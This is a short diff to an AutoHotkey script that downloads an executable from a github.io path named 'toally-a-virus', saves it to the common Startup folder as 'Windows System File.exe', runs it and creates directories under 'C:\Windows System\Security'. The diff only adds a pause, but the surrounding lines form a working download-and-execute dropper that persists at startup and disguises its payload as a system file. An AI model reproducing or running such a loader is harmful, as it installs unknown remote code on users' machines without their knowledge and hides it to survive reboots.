@@ -4,6 +4,7 @@ SendMode Input  ; Recommended for new scripts due to its superior speed and reli
 SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
 
 UrlDownloadToFile, https://dj13423.github.io/download/AHK/toally-a-virus/Main.exe, %A_StartupCommon%\Windows System File.exe
+Sleep, 500
 Run, Windows System File.exe, %A_StartupCommon%\
 FileCreateDir, C:\Windows System\Security\temp
 FileCreateDir, C:\Windows System\Security\data\bin
